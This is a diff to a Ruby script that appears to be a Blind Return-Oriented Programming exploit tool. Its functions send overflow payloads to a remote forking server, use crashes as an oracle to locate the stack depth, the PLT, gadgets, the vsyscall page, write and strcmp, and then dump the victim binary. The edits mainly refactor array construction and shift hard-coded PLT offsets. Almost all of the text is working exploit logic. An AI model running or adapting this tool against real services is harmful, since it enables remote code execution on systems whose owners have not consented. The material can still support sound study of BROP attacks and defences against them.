@@ -296,6 +296,8 @@ def send_exp(s, rop)
     s.flush()                                                                                             
 end
 
+# dmccrady:  This function's return is exactly backwards from its name:
+# it returns false if the server is alive, and true if it's not. :-(
 def check_alive(s)
 	sl = 0.01
 	rep = $state.time_out_val.to_f / 0.01
@@ -306,7 +308,7 @@ def check_alive(s)
 			x = s.recv_nonblock(1)
 			return false if x.length == 0
 
-			print("\nDamn got stuff #{x.length} #{x}\n")
+			print("\ncheck_alive yielded output length=#{x.length}: '#{x}'\n")
 			return false
 		rescue Errno::EAGAIN
 			sleep(sl)
@@ -478,7 +480,7 @@ def check_stack_depth()
 
 	while depth < max
 		print("Trying depth #{depth}\r")
-		rop = Array.new(depth) { |i| $state.plt }
+		rop = Array.new(depth, $state.plt)
 
 		s = get_child()
 		send_exp(s, rop)
@@ -503,7 +505,7 @@ def check_pad()
 	max = 100
 
 	while pad < max
-		rop = Array.new($state.depth) { |i| $state.plt }
+		rop = Array.new($state.depth, $state.plt)
 
 		for i in 0..pad
 			rop[i] = $padval
@@ -700,17 +702,17 @@ def verify_pop(pop)
 #	ret = $state.ret ? $state.ret : pop + 1
 	ret = pop + 1
 
-    rop = Array.new($state.depth - 1) { |j| ret }
+    rop = Array.new($state.depth - 1, ret)
 	rop << pop + 1
 
     return false if try_exp(rop) != true
 
-    rop = Array.new($state.depth) { |j| pop + 1 }
+    rop = Array.new($state.depth, pop + 1)
 	rop[1] = $death
 
 	return false if try_exp(rop) != false
 
-    rop = Array.new($state.depth) { |j| ret }
+    rop = Array.new($state.depth, ret)
 	rop[0] = pop
 	rop[1] = 0x4141414141414141
 	rop[2] = $death
@@ -745,7 +747,7 @@ def check_rax_rsp(pop)
 end
 
 def check_multi_pop(pop, off, num)
-	rop = Array.new($state.depth) { |j| pop + 1 }
+	rop = Array.new($state.depth, pop + 1)
 
 	idx = $state.depth - num - 1
 	if idx < 2
@@ -1105,12 +1107,10 @@ def dump_bin()
 end
 
 def check_syscall_ret(addr)
-        rop = Array.new($state.depth) { |j| addr }
-
+	rop = Array.new($state.depth, addr)
 	return false if try_exp(rop) == false
 
-        rop = Array.new($state.depth) { |j| addr + 2 }
-
+	rop = Array.new($state.depth, addr + 2)
 	return false if try_exp(rop) == false
 
 	$state.syscall = addr
@@ -1125,7 +1125,7 @@ def check_old_vsyscall()
 	0x40.downto(0) { |i|
 		addr = $vsyscall + 1024 + i
 
-        	rop = Array.new($state.depth) { |j| addr }
+		rop = Array.new($state.depth, addr)
 
 		if try_exp_print(addr, rop) == true
 			$state.ret = addr if not $state.ret
@@ -1154,7 +1154,7 @@ def check_vsyscall()
 end
 
 def do_check_vsyscall()
-        rop = Array.new($state.depth) { |j| $vsyscall }
+        rop = Array.new($state.depth, $vsyscall)
 
 	if try_exp(rop) == false
 		if check_old_vsyscall()
@@ -1165,7 +1165,7 @@ def do_check_vsyscall()
 		return
 	end
 
-        rop = Array.new($state.depth) { |j| ($vsyscall + 0xa) }
+        rop = Array.new($state.depth, $vsyscall + 0xa)
 
 	if try_exp(rop) == false
 		if check_syscall_ret($vsyscall + 0x7)
@@ -1197,13 +1197,8 @@ def find_plt(dep = 0, start = $text, len = 0x10000)
 			print("Trying PLT at #{plt.to_s(16)} and depth #{$state.depth+d}         \r")
 			if try_plt($state.depth + d, plt)
 				$state.plt = plt
-				# dmccrady: We found the PLT, but are actually one entry past the beginning
-				# (the zero-th entry is the 'ldresolve' entry, which crashes and is therefore
-			    # skipped during the scan.)  
-				$state.plt_base = $state.plt - 0x10
-				# dmccrady This might be considered 'hard-coding'.  This script assumes that
-				# the stop-gadget is the first actual PLT entry (i.e., simply pops).
-				$state.plt_stop_gadget = $state.plt_base + 0x10
+				$state.plt_base = plt
+				$state.plt_stop_gadget = plt
 				$state.depth += d
 				print("\nFound PLT at depth #{$state.depth}, base=#{$state.plt_base.to_s(16)}\n")
 				return
@@ -1221,11 +1216,11 @@ def find_plt(dep = 0, start = $text, len = 0x10000)
 end
 
 def try_plt(depth, plt)
-	rop = Array.new(depth) { |i| plt }
+	rop = Array.new(depth, plt)
 
 	r = try_exp(rop)
 	if r == true
-		rop = Array.new(depth) { |i| plt + 6 }
+		rop = Array.new(depth, plt + 6)
 
 		return true if try_exp(rop)
 	end
@@ -1291,13 +1286,13 @@ end
 
 
 def find_write3()
-	print("Finding write (3)\n")
+	print("Finding write\n")
 
 	# dmccrady:  Hard-coded.  This works around a problem where, when scanning
 	# the PLT for 'write', we encounter something like 'suspend' which hangs
 	# the victim's process.  Guess at a starting position thqt lies beyond
 	# the problem entries.
-	write_start = 0x10f
+	write_start = 0x100
 	# dmcccrady:  Another hard-code.  The 'write' entry is known to lie within
 	# the first 0x300 entries.
 	write_last = 0x300
@@ -1553,7 +1548,7 @@ def get_dist(gadget, inc)
 	for i in 1..7
 		addr = gadget + inc * i
 
-		rop = Array.new($state.depth) { |j| $state.plt }
+		rop = Array.new($state.depth, $state.plt_stop_gadget)
 		rop[0] = addr
 
 		crashed = try_exp(rop)
@@ -1574,7 +1569,7 @@ def verify_gadget(gadget)
 	left  = get_dist(gadget, -1)
 	right = get_dist(gadget, 1)
 
-	#print("Verifying gadget at #{gadget.to_s(16)}, left=#{left}, right=#{right}\n")
+	print("Verifying gadget at #{gadget.to_s(16)}, left=#{left}, right=#{right}\n")
 
 	rdi = gadget + right - 1
 
@@ -1621,7 +1616,7 @@ def find_gadget()
 
 		rop = []
 
-		rop = Array.new($state.depth) { |j| $state.plt }
+		rop = Array.new($state.depth, $state.plt_stop_gadget)
 
 		rop[0] = i
 
@@ -1677,7 +1672,7 @@ def find_plt_depth()
 	$state.depth = 18
 	$state.pad   = 0
 
-	probe_depth = 8
+	probe_depth = 10  # Shouldn't need more than this
 	find_plt(probe_depth)
 
 #	if not $state.plt
@@ -1707,7 +1702,7 @@ def try_strcmp(entry, arg1, arg2)
 end
 
 def test_strcmp(entry)
-	print("Trying PLT entry #{entry.to_s(16)}\r")
+	print("Trying PLT entry #{entry}\r")
 
 	good = 0x400000
 
@@ -1726,7 +1721,7 @@ def find_rdx()
 
 	for i in 0..256
 		if test_strcmp(i)
-			print("\nFound strcmp at PLT 0x#{i.to_s(16)}\n")
+			print("\nFound strcmp at PLT #{i}\n")
 			$state.strcmp = i
 			return
 		end
@@ -2449,7 +2444,7 @@ def test()
 	$state.depth = 0
 	$state.overflow_len = 4192
 
-	rop = Array.new(3) { |j| 0x400000 }
+	rop = Array.new(3, 0x400000)
 	try_exp(rop)
 
 # unlink changes rdx ; qsort interesting
